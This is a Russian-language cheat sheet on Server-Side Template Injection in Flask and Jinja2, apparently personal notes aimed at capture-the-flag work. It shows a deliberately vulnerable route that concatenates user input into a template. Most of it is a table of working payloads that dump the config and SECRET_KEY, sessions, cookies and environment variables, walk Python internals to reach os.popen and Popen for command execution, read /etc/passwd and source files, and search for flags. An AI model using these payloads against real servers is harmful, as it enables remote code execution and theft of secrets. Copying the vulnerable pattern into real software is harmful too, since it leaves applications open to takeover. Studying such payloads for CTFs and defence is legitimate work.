
---
---
## Что такое SSTI
**Server-Side Template Injection** — уязвимость, возникающая при небезопасном использовании шаблонизаторов ([[Jinja2]], Twig, Freemarker и др.). Если пользовательский ввод **конкатенируется** в строку шаблона вместо передачи в качестве переменной, злоумышленник может внедрить код, выполняемый на сервере.
### 🔴 Уязвимый пример (Flask + Jinja2)
```python
from flask import Flask, render_template_string, request
app = Flask(__name__)
@app.route('/')
def home():
    content = request.args.get('content', '')
    # 🔴 ОПАСНО: конкатенация в шаблон
    return render_template_string('<h1>' + content + '</h1>')
```


---

## Разведка через SSTI

###  Доступ к конфигурации Flask

```c
Доступ к конфигурации
{{ config }}
{{ config.items() }}
{{ config['SECRET_KEY'] }}
{{ config.DEBUG }}

 Информация о запросе
{{ request }}
{{ request.method }}
{{ request.url }}
{{ request.headers }}
{{ request.cookies }}
{{ request.environ }}

Сессии
{{ session }}
{{ session.items() }}
{{ session['user_id'] }}

Глобальные объекты Flask
{{ url_for }}
{{ url_for.__globals__ }}
{{ get_flashed_messages.__globals__ }}
{{ lipsum.__globals__ }}
{{ g }}
{{ current_app }}

Доступ к ОС
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

Чтение файла
{{ self.__init__.__globals__.__builtins__.open(__file__).read() }}

```

| Проверка SSTI        | `{{7*7}}`                                                                                                                   |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| Конфиг               | `{{config}}`                                                                                                                |
| Сессия               | `{{session}}`                                                                                                               |
| Все глобалы          | `{{self.__init__.__globals__}}`                                                                                             |
| Все классы           | `{{''.__class__.__mro__[1].__subclasses__()}}`                                                                              |
| Поиск Popen          | `{% for c in [].__class__.__base__.__subclasses__() %}{% if 'Popen' in c.__name__ %}{{loop.index0}}{% endif %}{% endfor %}` |
| Команда через Popen  | `{{''.__class__.__mro__[1].__subclasses__()[401]('id', shell=True, stdout=-1).communicate()}}`                              |
| Команда через os     | `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}`                                            |
| Чтение файла         | `{{open('/etc/passwd').read()}}`                                                                                            |
| Листинг корня        | `{{self.__init__.__globals__.__builtins__.__import__('os').listdir('/')}}`                                                  |
| Поиск флага          | `{{self.__init__.__globals__.__builtins__.__import__('os').popen('find / -name "*flag*" 2>/dev/null').read()}}`             |
| Переменные окружения | `{{self.__init__.__globals__.__builtins__.__import__('os').environ}}`                                                       |
| Путь текущего файла  | `{{__file__}}`                                                                                                              |